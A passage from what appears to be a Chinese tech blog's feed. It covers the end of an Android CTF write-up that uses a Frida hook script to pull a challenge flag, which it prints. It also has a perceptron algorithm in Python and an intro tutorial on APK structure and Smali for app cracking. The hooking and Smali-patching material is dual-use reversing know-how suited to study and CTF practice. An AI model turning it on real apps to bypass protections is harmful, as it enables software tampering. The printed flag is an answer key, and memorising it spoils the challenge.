class="string">        onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">            send(&quot;Hook start&quot;);</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        onLeave: function(retval)&#123;</span></span><br><span class="line"><span class="string">            send(&quot;perhapsThis_result:&quot; + getjstring(retval));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">setImmediate(main);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printMessage</span>(<span class="params">message,data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;CTF Application&#x27;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,printMessage)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>运行，点击按钮，打印返回值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell\Desktop&gt;python hookso.py</span><br><span class="line">Hook start</span><br><span class="line">perhapsThis_result:Congratulation!YouFoundTheRightActivityHereYouGo-CTF&#123;IDontHaveABadjokeSorry&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;IDontHaveABadjokeSorry&#125;</span><br></pre></td></tr></table></figure><h1 id="21-LoopCrypto"><a href="#21-LoopCrypto" class="headerlink" title="21. LoopCrypto"></a>21. LoopCrypto</h1><img src="/posts/9f62af2/21.1.png" class="" title="运行程序">]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-app1&quot;&gt;&lt;a href=&quot;#1-app1&quot; class=&quot;headerlink&quot; title=&quot;1. app1&quot;&gt;&lt;/a&gt;1. app1&lt;/h1&gt;&lt;p&gt;这道题之前做过，也没什么难度，所以不想再说了。这道题的一个知识点就是程序自身的版本号版本名在BuildConfig中存储。&lt;/p&gt;
&lt;img src=&quot;/posts/9f62af2/1.1.png&quot; class=&quot;&quot; title=&quot;jeb分析&quot;&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
    <category term="Reverse" scheme="http://example.com/tags/Reverse/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>感知机学习算法</title>
    <link href="http://example.com/posts/2670ba0d.html"/>
    <id>http://example.com/posts/2670ba0d.html</id>
    <published>2022-04-05T01:29:28.242Z</published>
    <updated>2022-04-11T05:25:25.212Z</updated>
    
    <content type="html"><![CDATA[<p>机器学习的第一个作业，写完纸质还有时间，那就用Python写算法试试咯，老师说后面有真正的实验报告，先用Python写一下熟悉熟悉，回顾一下前几天学的Python吧。</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#感知机学习算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ganzhiji</span>(<span class="params">lst,n,w,b</span>):</span><br><span class="line">    result = [-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">while</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(result)).count(<span class="string">&#x27;-&#x27;</span>)!=<span class="number">0</span>):</span><br><span class="line">        result.clear()</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> lst:</span><br><span class="line">            <span class="built_in">sum</span> = x[<span class="number">2</span>] * (w[<span class="number">0</span>]*x[<span class="number">0</span>] + w[<span class="number">1</span>]*x[<span class="number">1</span>] + b)</span><br><span class="line">            result.append(<span class="built_in">sum</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">sum</span> &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;对(&#123;0&#125;,&#123;1&#125;)T&quot;</span>.<span class="built_in">format</span>(x[<span class="number">0</span>],x[<span class="number">1</span>]))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;y(wx + b) = &#123;0&#125;(&#123;1&#125;*&#123;2&#125; + &#123;3&#125;*&#123;4&#125; + &#123;5&#125;) &gt; 0&quot;</span>.<span class="built_in">format</span>(x[<span class="number">2</span>],w[<span class="number">0</span>],x[<span class="number">0</span>],w[<span class="number">1</span>],x[<span class="number">1</span>],b), end=<span class="string">&quot;，&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;(&#123;0&#125;,&#123;1&#125;)T被正确分类&quot;</span>.<span class="built_in">format</span>(x[<span class="number">0</span>], x[<span class="number">1</span>]))</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;对(&#123;0&#125;,&#123;1&#125;)T&quot;</span>.<span class="built_in">format</span>(x[<span class="number">0</span>],x[<span class="number">1</span>]))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;y(wx + b) = &#123;0&#125;(&#123;1&#125;*&#123;2&#125; + &#123;3&#125;*&#123;4&#125; + &#123;5&#125;) &lt;= 0&quot;</span>.<span class="built_in">format</span>(x[<span class="number">2</span>],w[<span class="number">0</span>],x[<span class="number">0</span>],w[<span class="number">1</span>],x[<span class="number">1</span>],b), end=<span class="string">&quot;，&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;(&#123;0&#125;,&#123;1&#125;)T未被正确分类，更新w和b&quot;</span>.<span class="built_in">format</span>(x[<span class="number">0</span>], x[<span class="number">1</span>]))</span><br><span class="line">                w[<span class="number">0</span>] = w[<span class="number">0</span>] + n*x[<span class="number">2</span>]*(x[<span class="number">0</span>])</span><br><span class="line">                w[<span class="number">1</span>] = w[<span class="number">1</span>] + n*x[<span class="number">2</span>]*(x[<span class="number">1</span>])</span><br><span class="line">                b = b + n*x[<span class="number">2</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;w = (&#123;0&#125;,&#123;1&#125;)T, b = &#123;2&#125;&quot;</span>.<span class="built_in">format</span>(w[<span class="number">0</span>],w[<span class="number">1</span>],b))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;得到线性模型：&#123;0&#125;x(1) + &#123;1&#125;x(2) + &#123;2&#125;&quot;</span>.<span class="built_in">format</span>(w[<span class="number">0</span>],w[<span class="number">1</span>],b))</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#lst = [[4,3,1],[4,4,1],[3,1,-1]]</span></span><br><span class="line">    <span class="comment">#n = 1</span></span><br><span class="line">    w = [<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    b = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;该算法默认权值w和偏置b都从0开始&quot;</span>)</span><br><span class="line">    lst = []</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        z = <span class="built_in">input</span>(<span class="string">&quot;输入数据集，比如(x,y)=[3,1,-1]输入3 1 -1，输入end结束：&quot;</span>)</span><br><span class="line">        x_list = z.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.join(x_list) == <span class="string">&quot;end&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x_list)):</span><br><span class="line">            x_list[i] = <span class="built_in">int</span>(x_list[i])</span><br><span class="line">        lst.append(x_list)</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;算法的学习率为(0&lt;n&lt;=1)：&quot;</span>))</span><br><span class="line">    ganzhiji(lst,n,w,b)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;机器学习的第一个作业，写完纸质还有时间，那就用Python写算法试试咯，老师说后面有真正的实验报告，先用Python写一下熟悉熟悉，回顾一下前几天学的Python吧。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
    <category term="机器学习" scheme="http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门教程</title>
    <link href="http://example.com/posts/15be101a.html"/>
    <id>http://example.com/posts/15be101a.html</id>
    <published>2022-04-05T01:29:28.232Z</published>
    <updated>2022-04-11T05:25:15.797Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-初识APK、Dalvik字节码以及Smali"><a href="#1-初识APK、Dalvik字节码以及Smali" class="headerlink" title="1. 初识APK、Dalvik字节码以及Smali"></a>1. 初识APK、Dalvik字节码以及Smali</h1><p>后缀名为<code>.apk</code>是安卓手机app的格式。它的实质是一个ZIP压缩包，将它的后缀名修改为<code>.zip</code>便可以看到内部的文件结构。解压出来后一般有以下文件：</p><span id="more"></span><div class="table-container"><table><thead><tr><th>文件</th><th>作用</th></tr></thead><tbody><tr><td>asset文件夹</td><td>资源目录1，asset和res都是资源目录但有所区别</td></tr><tr><td>lib文件夹</td><td>so库存放位置，一般由NDK编译得到，常见于使用游戏引擎或JNI native调用的工程中</td></tr><tr><td>META-INF文件夹</td><td>存放工程一些属性文件，例如Manifest.MF</td></tr><tr><td>res文件夹</td><td>资源目录2，asset和res都是资源目录但有所区别</td></tr><tr><td>AndroidManifest.xml</td><td>Android工程的基础配置属性文件</td></tr><tr><td>classes.dex</td><td>Java代码编译得到的Dalvik VM能直接执行的文件</td></tr><tr><td>resources.arsc</td><td>对res目录下的资源的一个索引文件，保存了原工程中strings.xml等文件内容</td></tr><tr><td>其他文件夹 etc.</td></tr></tbody></table></div><h2 id="1-1-asset-VS-res"><a href="#1-1-asset-VS-res" class="headerlink" title="1.1 asset VS. res"></a>1.1 asset VS. res</h2><p>res目录下的资源文件在编译时会自动生成索引文件(R.java)，在Java代码中用R.xxx.yyy来引用；而asset目录下的资源文件不需要生成索引，在Java代码中需要用AssetManager来访问。</p><p>一般来说，除了音频和视频资源(需要放在raw或asset下)，使用Java开发的Android工程使用到的资源文件都会放在res下；使用C++游戏引擎(或使用Lua Unity3D等)的资源文件均需要放在asset下。</p><h2 id="1-2-Dalvik字节码"><a href="#1-2-Dalvik字节码" class="headerlink" title="1.2 Dalvik字节码"></a>1.2 Dalvik字节码</h2><p>Dalvik字节码是学习破解的基础。Dalvik是Google专门为Android操作系统设计的一个虚拟机，经过深度的优化。虽然Android上的程序是使用Java来开发的，但是Dalvik和标准的Java虚拟机JVM还是两回事。Dalvik VM是基于寄存器的，而JVM是基于栈的；Dalvik有专属的文件执行格式dex(dalvik executable)，而JVM则执行的是Java字节码。Dalvik VM比JVM速度更快，占用空间更少。</p><p>通过Dalvik的字节码不能直接看到原来的逻辑代码，这是需要借助如Apktool或dex2jar+jd-gui工具来帮助查看。但是，需要注意的是最终我们修改APK需要操作的文件是<code>.smali</code>文件，而不是导出来的Java文件重新编译。</p><h2 id="1-3-Smali"><a href="#1-3-Smali" class="headerlink" title="1.3 Smali"></a>1.3 Smali</h2><p>Smali是破解的重中之重。Smali，Baksmali分别是指安卓系统里的Java虚拟机(Dalvik)所使用的一种。dex格式文件的汇编器，反汇编器。其语法是一种宽松式的Jasmin/dedexer语法，而且它实现了<code>.dex</code>格式所有功能(注解，调试信息，线路信息等)。</p><p>当对APK文件进行反编译后，便会生成此类的文件。在Dalvik字节码中，寄存器都是32位的，能够支持任何类型；64位类型(Long/Double)用2个寄存器表示。Dalvik字节码有两种类型：原始类型、引用类型(包括对象和数组)。</p><div class="table-container"><table><thead><tr><th>原始类型简写</th><th>原始类型</th></tr></thead><tbody><tr><td>B</td><td>byte</td></tr><tr><td>C</td><td>char</td></tr><tr><td>D</td><td>double</td></tr><tr><td>F</td><td>float</td></tr><tr><td>I</td><td>int</td></tr><tr><td>J</td><td>long</td></tr><tr><td>S</td><td>short</td></tr><tr><td>V</td><td>void</td></tr><tr><td>Z</td><td>boolean</td></tr><tr><td>[XXX</td><td>array</td></tr><tr><td>Lxxx/yyy</td><td>object</td></tr></tbody></table></div><p>数组的表示方式是：在基本类型前加上中括号<code>[</code>，例如int数组和float数组分别表示为：<code>[I</code>，<code>[F</code>；对象的表示则以<code>L</code>作为开头，格式是<code>Lpackage/objectName;</code>(注意必须有个分号跟在后面)，例如String对象在Smali中为：<code>Ljava/lang/String;</code>，其中java/lang对应java.lang包，String就是定义在该包中的一个对象。</p><p>或许有人问，既然类是用<code>LpackageName/objectName;</code>来表示，那类里面的内部类又如何在smali中引用呢？<code>LpackageName/objectName$subObjectName;</code>，也就是在内部类前加<code>$</code>符号。</p><p>方法的定义一般为：</p><p>​                                Func-Name(Para-Type1Para-Type2Para-Type3…)Return-Type</p><p>注意参数与参数之间没有任何分隔符。</p><div class="table-container"><table><thead><tr><th>方法</th><th>意义</th></tr></thead><tbody><tr><td>hello ()V</td><td>void hello()</td></tr><tr><td>hello (III)Z</td><td>boolean hello(int, int, int)</td></tr><tr><td>hello (Z[I[ILjava/lang/String;J)Ljava/lang/String;</td><td>String hello(boolean, int[], int[], String, long)</td></tr></tbody></table></div><h3 id="1-3-1-Smali基本语法"><a href="#1-3-1-Smali基本语法" class="headerlink" title="1.3.1 Smali基本语法"></a>1.3.1 Smali基本语法</h3><div class="table-container"><table><thead><tr><th>基本语法</th><th>含义</th></tr></thead><tbody><tr><td>.field private isFlag:Z</td><td>定义变量</td></tr><tr><td>.method</td><td>方法</td></tr><tr><td>.parameter</td><td>方法参数</td></tr><tr><td>.prologue</td><td>方法开始</td></tr><tr><td>.line 123</td><td>此方法位于第123行</td></tr><tr><td>invoke-super</td><td>调用父函数</td></tr><tr><td>const/high16 v0, 0x7f03</td><td>把0x7f03赋值给v0</td></tr><tr><td>invoke-direct</td><td>调用函数</td></tr><tr><td>return-void</td><td>函数返回void</td></tr><tr><td>.end method</td><td>函数结束</td></tr><tr><td>new-instance</td><td>创建实例</td></tr><tr><td>input-object</td><td>对象赋值</td></tr><tr><td>iget-object</td><td>调用对象</td></tr><tr><td>invoke-static</td><td>调用静态函数</td></tr></tbody></table></div><h3 id="1-3-2-条件跳转分支"><a href="#1-3-2-条件跳转分支" class="headerlink" title="1.3.2 条件跳转分支"></a>1.3.2 条件跳转分支</h3><div class="table-container"><table><thead><tr><th>用法</th><th>含义</th></tr></thead><tbody><tr><td>if-eq vA, vB, :cond_0</td><td>如果vA等于vB则跳转到:cond_0</td></tr><tr><td>if-ne vA, vB, :cond_0</td><td>如果vA不等于vB则跳转到:cond_0</td></tr><tr><td>if-lt vA, vB, :cond_0</td><td>如果vA小于vB则跳转到:cond_0</td></tr><tr><td>if-gt vA, vB, :cond_0</td><td>如果vA大于vB则跳转到:cond_0</td></tr><tr><td>if-ge vA, vB, :cond_0</td><td>如果vA大于等于vB则跳转到:cond_0</td></tr><tr><td>if-le vA, vB, :cond_0</td><td>如果vA小于等于vB则跳转到:cond_0</td></tr><tr><td>if-eqz vA, :cond_0</td><td>如果vA等于0则跳转到:cond_0</td></tr><tr><td>if-nez vA, :cond_0</td><td>如果vA不等于0则跳转到:cond_0</td></tr><tr><td>if-ltz vA, :cond_0</td><td>如果vA小于0则跳转到:cond_0</td></tr><tr><td>if-gtz vA, :cond_0</td><td>如果vA大于0则跳转到:cond_0</td></tr><tr><td>if-gez vA, :cond_0</td><td>如果vA大于等于0则跳转到:cond_0</td></tr><tr><td>if-lez vA, :cond_0</td><td>如果vA小于等于0则跳转到:cond_0</td></tr></tbody></table></div><h3 id="1-3-3-Smali中的包信息"><a href="#1-3-3-Smali中的包信息" class="headerlink" title="1.3.3 Smali中的包信息"></a>1.3.3 Smali中的包信息</h3><p><code>.class public Lcom/aaaaa;</code>：是com这个package下的一个类aaaaa</p><p><code>.super Lcom/bbbbb;</code>：继承自com.bbbbb这个类</p><p><code>.source &quot;ccccc.java&quot;</code>：由ccccc.java编译得到的smali文件</p><p>一般来说在smali文件中是这样子的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># annotations</span><br><span class="line">.annotation system Ldalvik/annotation/MemberClasses;</span><br><span class="line">value=&#123;</span><br><span class="line">Lcom/aaa$qqq;,</span><br><span class="line">Lcom/aaa$www;</span><br><span class="line">&#125;</span><br><span class="line">.end annotation</span><br></pre></td></tr></table></figure><p>这个声明是内部类的声明：aaa这个类它有两个成员内部类——qqq和www。</p><h3 id="1-3-4-Smali中的成员变量"><a href="#1-3-4-Smali中的成员变量" class="headerlink" title="1.3.4 Smali中的成员变量"></a>1.3.4 Smali中的成员变量</h3><p>格式：<code>.field public/private [static][final] varName:&lt;类型&gt;</code></p><p>对于不同的成员变量也有不同的指令。一般来说，获取的指令有：iget, sget, iget-boolean, sget-boolean, iget-object, sget-object等。操作的指令有：iput, sput, iput-boolean, sput-boolean, iput-object, sput-object等。</p><p>没有<code>-object</code>后缀的表示操作的成员变量对象是基本数据类型，带<code>-object</code>表示操作的成员变量是对象类型。特别地，boolean类型则使用带<code>-boolean</code>的指令操作。</p><p>例1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sget-object v0, Lcom/aaa;-&gt;ID:Ljava/lang/String;</span><br></pre></td></tr></table></figure><p>sget-object就是用来获取变量值并保存到紧接着的参数的寄存器中，本例中，它获取ID这个String类型的成员变量并放到v0这个寄存器中。注意，前面需要该变量所属的类的类型，后面需要加一个冒号和该成员变量的类型，中间的“-&gt;”表示所属关系。</p><p>例2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iget-object v0, p0, Lcom/aaa;-&gt;view:Lcom/aaa/view;</span><br></pre></td></tr></table></figure><p>可以看到iget-object指令比sget-object多了一个参数，就是该变量所在类的对象，p0即“this”。</p><p>获取array的话可以用aget和aget-object，指令使用方法和上述一致。</p><p>例3：put指令的使用和get指令是统一的如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const/4 v3, 0x0</span><br><span class="line">sput-object v3, Lcom/aaa;-&gt;timer:Lcom/aaa/timer;</span><br></pre></td></tr></table></figure><p>相当于<code>this.timer=null;</code>。</p><p>注意，这里是因为赋值object所以是null；若是boolean的话应该是0。</p><p>例4：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.local v0, args:Landroid/os/Message;</span><br><span class="line">const/4 v1, 0x12</span><br><span class="line">iput v1, v0, Landroid/os/Message;-&gt;what:l</span><br></pre></td></tr></table></figure><p>相当于<code>args.what=18;</code>(args是Message的对象)。</p><h3 id="1-3-5-Smali中函数的调用"><a href="#1-3-5-Smali中函数的调用" class="headerlink" title="1.3.5 Smali中函数的调用"></a>1.3.5 Smali中函数的调用</h3><p>smali中的函数和成员变量一样也分为两种类型，分别为direct和virtual之分。那么direct method和virtual method有什么区别呢？</p><p>简单来说，direct method就是private函数，其余的public和protected函数都属于virtual method。所以在调用函数时，有invoke-direct，invoke-virtual，另外还有invoke-static、invoke-super以及invoke-interface等几种不同的指令。</p><p>当然其实还有invoke-XXX/range 指令的，这是参数多于4个的时候调用的指令，比较少见，了解下即可。</p><h4 id="invoke-static"><a href="#invoke-static" class="headerlink" title="invoke-static"></a>invoke-static</h4><p>用于调用static函数的。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;&#125;, Lcom/aaa;-&gt;CheckSignature()Z</span><br></pre></td></tr></table></figure><p>这里注意到invoke-static后面有一对大括号“{}”，其实是调用该方法的实例+参数列表，由于这个方法既不需参数也是static的，所以{}内为空。</p><p>再看一个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const-string v0, &quot;NDKLIB&quot; </span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><p>这个是调用static void System.loadLibrary(String)来加载NDK编译的so库用的方法，同样也是这里v0就是参数“NDKLIB”了。</p><h4 id="invoke-super"><a href="#invoke-super" class="headerlink" title="invoke-super"></a>invoke-super</h4><p>调用父类方法用的指令，一般用于调用onCreate、onDestroy等方法。</p><h4 id="invoke-direct"><a href="#invoke-direct" class="headerlink" title="invoke-direct"></a>invoke-direct</h4><p>调用private函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-direct &#123;p0&#125;, Landroid/app/TabActivity;-&gt;&lt;init&gt;()V</span><br></pre></td></tr></table></figure><p>这里init()就是定义在TabActivity中的一个private函数。</p><h4 id="invoke-virtual"><a href="#invoke-virtual" class="headerlink" title="invoke-virtual"></a>invoke-virtual</h4><p>用于调用protected或public函数，同样注意修改smali时不要错用invoke-direct或invoke-static。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sget-object v0, Lcom/dddd;-&gt;bbb:Lcom/ccc;</span><br><span class="line">invoke-virtual &#123;v0, v1&#125;, Lcom/ccc;-&gt;Messages(Ljava/lang/Object;)V</span><br></pre></td></tr></table></figure><p>v0是bbb:Lcom/ccc，v1是传递给Messages方法的Ljava/lang/Object参数。</p><h4 id="invoke-xxxxx-range"><a href="#invoke-xxxxx-range" class="headerlink" title="invoke-xxxxx/range"></a>invoke-xxxxx/range</h4><p>当方法的参数多于5个时（含5个），不能直接使用以上的指令，而是在后面加上“/range”，range表示范围，使用方法也有所不同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-direct/range &#123;v0 .. v5&#125;, Lcmb/pb/ui/PBContainerActivity;-&gt;h(ILjava/lang/CharSequence;Ljava/lang/String;Landroid/content/Intent;I)Z</span><br></pre></td></tr></table></figure><p>需要传递v0到v5一共6个参数，这时候大括号内的参数采用省略形式，且需要连续。</p><h3 id="1-3-6-Smali中函数返回的结果的操作"><a href="#1-3-6-Smali中函数返回的结果的操作" class="headerlink" title="1.3.6 Smali中函数返回的结果的操作"></a>1.3.6 Smali中函数返回的结果的操作</h3><p>在Java代码中调用函数和返回函数结果可以用一条语句完成，而在Smali里则需要分开来完成，在使用上述指令后，如果调用的函数返回非void，那么还需要用到move-result（返回基本数据类型）和move-result-object（返回对象）指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v0, &quot;Eric&quot;</span><br><span class="line">invoke-static &#123;v0&#125;, Lcmb/pbi;-&gt;t(Ljava/lang/String;)Ljava/lang/String;</span><br><span class="line">move-result-object v2</span><br></pre></td></tr></table></figure><p>v2保存的就是调用t方法返回String字符串。</p><h3 id="1-3-7-Smali中函数实体分析—if函数分析"><a href="#1-3-7-Smali中函数实体分析—if函数分析" class="headerlink" title="1.3.7 Smali中函数实体分析—if函数分析"></a>1.3.7 Smali中函数实体分析—if函数分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.method <span class="keyword">private</span> <span class="title function_">ifRegistered</span><span class="params">()</span>Z</span><br><span class="line">    .locals <span class="number">2</span><span class="comment">//在这个函数中本地寄存器的个数，2个</span></span><br><span class="line">    .prologue</span><br><span class="line">    const/<span class="number">4</span> v0, <span class="number">0x1</span>     <span class="comment">// v0赋值为1</span></span><br><span class="line">    .local v0, tempFlag:Z</span><br><span class="line">    <span class="keyword">if</span>-eqz v0, :cond_0            <span class="comment">// 判断v0是否等于0，等于0则跳到cond_0执行</span></span><br><span class="line">    const/<span class="number">4</span> v1, <span class="number">0x1</span>            <span class="comment">// 符合条件分支</span></span><br><span class="line">    :goto_0<span class="comment">//标签</span></span><br><span class="line">    <span class="keyword">return</span> v1<span class="comment">//返回v1的值</span></span><br><span class="line">    :cond_0<span class="comment">//标签</span></span><br><span class="line">    const/<span class="number">4</span> v1, <span class="number">0x0</span>            <span class="comment">// cond_0分支</span></span><br><span class="line">    goto :goto_0<span class="comment">//跳到goto_0执行 即返回v1的值  这里可以改成return v1  也是一样的</span></span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><h3 id="1-3-8-Smali中函数实体分析—for函数分析"><a href="#1-3-8-Smali中函数实体分析—for函数分析" class="headerlink" title="1.3.8 Smali中函数实体分析—for函数分析"></a>1.3.8 Smali中函数实体分析—for函数分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const/<span class="number">4</span> v0, <span class="number">0x0</span>   <span class="comment">//v0 = 0;</span></span><br><span class="line">.local v0, i:I</span><br><span class="line">:goto_0</span><br><span class="line"><span class="keyword">if</span>-lt v0, v3, :cond_0     <span class="comment">//  v0小于v3 则跳到cond_0并执行分支 :cond_0</span></span><br><span class="line"><span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">:cond_0                <span class="comment">// 标签</span></span><br><span class="line">iget-object v1, p0, Lcom/aaa/MainActivity;-&gt;listStrings:Ljava/util/List;        <span class="comment">// 引用对象</span></span><br><span class="line">const-string v2, <span class="string">&quot;Eric&quot;</span></span><br><span class="line">invoke-interface &#123;v1, v2&#125;, Ljava/util/List;-&gt;add(Ljava/lang/Object;)Z    <span class="comment">// List是接口, 执行接口方法add</span></span><br><span class="line">add-<span class="type">int</span>/lit8 v0, v0, <span class="number">0x1</span>　　　　<span class="comment">// 将第二个v0寄存器中的值，加上0x1的值放入第一个寄存器中, 实现自增长</span></span><br><span class="line">goto :goto_0                <span class="comment">// 回去:goto_0标签</span></span><br></pre></td></tr></table></figure><h3 id="1-3-9-课后习题"><a href="#1-3-9-课后习题" class="headerlink" title="1.3.9 课后习题"></a>1.3.9 课后习题</h3><p>翻译成Java代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.local <span class="number">4</span>                   <span class="comment">//本地寄存器4个，即v0,v1,v2,v3</span></span><br><span class="line">const/<span class="number">4</span> v2, <span class="number">0x1</span>            <span class="comment">//4字节常量v2=1</span></span><br><span class="line">const/<span class="number">16</span> v1, <span class="number">0x10</span>          <span class="comment">//16字节常量v1=16</span></span><br><span class="line">:local v1, <span class="string">&quot;length&quot;</span>:I      <span 